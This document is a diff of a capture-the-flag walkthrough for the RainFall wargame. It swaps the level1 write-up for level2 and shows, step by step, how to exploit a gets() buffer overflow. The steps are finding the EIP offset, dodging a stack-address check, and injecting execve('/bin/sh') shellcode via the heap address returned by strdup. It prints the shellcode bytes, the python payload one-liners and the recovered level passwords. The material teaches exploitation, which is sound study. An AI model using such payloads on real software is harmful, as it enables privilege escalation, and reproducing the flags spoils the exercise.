@@ -1,55 +1,66 @@
-level1
+level2
 ======
 
-*	We spawn with a [level1](source/level1) executable
+*	We spawn with a [level2](source/level2) executable
 	```console
-	level1@RainFall:~$ ls -l
-	total 732
-	level1@RainFall:~$ ls -l 
+	level2@RainFall:~$ ls -l 
 	total 8
-	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
-	level1@RainFall:~$ ./level1
-	█
-	level1@RainFall:~$ ./level1 test
+	-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+	level2@RainFall:~$ ./level2 
 	█
 	```
-	`./level1` is execute as `level2` user
-*	It is reading on `STDIN`
-*	From now on I will be using [Ghidra](https://ghidra-sre.org/) as a decompiler even tho I made a small script to disassemble our programs
-*	Let's take a look at the [code](./source/level1.c)
-*	The `main` declares a variable of `76` bytes on the stack and executes `gets()` on it
-*	We also have another function called `run()` (which is never called btw) :
-	-	execute `fwrite()` with and string on STDOUT
-	-	calls `system()` to execute `/bin/sh`
-*	We want to try a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/) to access the function to execute `/bin/sh` as level2
-*	We can use a generated string from this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to make the offset easier to spot
+*	Let's take a look at the code in gdb
 	```gdb
+	(gdb) info functions
+	All defined functions:
+	...
+	0x080484d4  p
+	0x0804853f  main
+	...
+	```
+*	We can see two functions : `p` and `main`
+	-	`main` is just calling `p`
+	-	`p` is a bit more complicated :
+		-	declares an array of `76` char
+		-	`gets` in this array
+		-	protect the return addressand uses `printf` 
+		-	uses `puts` and `strdup` on our array
+*	Let's try overflowing the buffer
+	```console
 	(gdb) r
-	Starting program: /home/user/level1/level1 
+	Starting program: /home/user/level2/level2 
 	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7A
 
 	Program received signal SIGSEGV, Segmentation fault.
-	0x63413563 in ?? ()
-	(gdb) 
+	0x37634136 in ?? ()
 	```
-	It makes it easier to spot since when we take a look at `$eip`, we can check the corresponding 4 bytes `0x63413563` since every 4 bytes is different in this string. we confirm that the offset is at 76 bytes
-*	Next step is to retrieve the address of `run`
-	```gdb
-	(gdb) p run
-	$1 = {<text variable, no debug info>} 0x8048444 <run>
+	we found out that the offset of `$eip` is equal to `80`
+*	It is nice to have a weakness in the code and the offset but there is nothing to exploit inside of it. So we need to use a shellcode to execute `/bin/sh`.
+*	Crafting the payload :
+	-	buffer = 80 bytes
+	-	shellcode (`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`) = 23 bytes
+	-	return address = 4 bytes
+*	But of course it is never that easy, so this time it seems that there is `cmp` to make sure we don't overwrite the return address within a certain range
+	```assembly
+	and    $0xb0000000,%eax
+	cmp    $0xb0000000,%eax
 	```
-	We need not to forget the little endian rule when writting the payload -> `\x44\x84\x04\x08`
-*	We have everything we need, here is the payload :
+	Basically, it restrict anything that starts with `0xb` to make sure we don't use the stack
+*	So we need to use the heap !
 	```console
-	level1@RainFall:~$ python -c 'print "a"*76  + "\x44\x84\x04\x08"' > /tmp/payload
+	level2@RainFall:~$ ltrace ./level2 
+	...
+	strdup("")                                                                                = 0x0804a008
+	...
 	```
-	Be carefull if you are using perl, python is adding a newline at the end but with `perl -e` you have to add it at the end or it won't be clean
-*	Now for the execution we have to make sure to use `cat payload -` so that it keeps listening on STDIN instead of just exiting after the segfault
+	this allow us to retrieve the return address of `strdup` -> `\x08\xa0\x04\x08`
+*	We tried this
 	```console
-	level1@RainFall:~$ cat /tmp/payload - | ./level1 
-	Good... Wait what?
+	level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"' > /tmp/payload
+	level2@RainFall:~$ cat /tmp/payload - | ./level2 
 	whoami
-	level2
-	cat /home/user/level2/.pass
-	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+	level3
+	cat /home/user/level3/.pass
+	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 	```
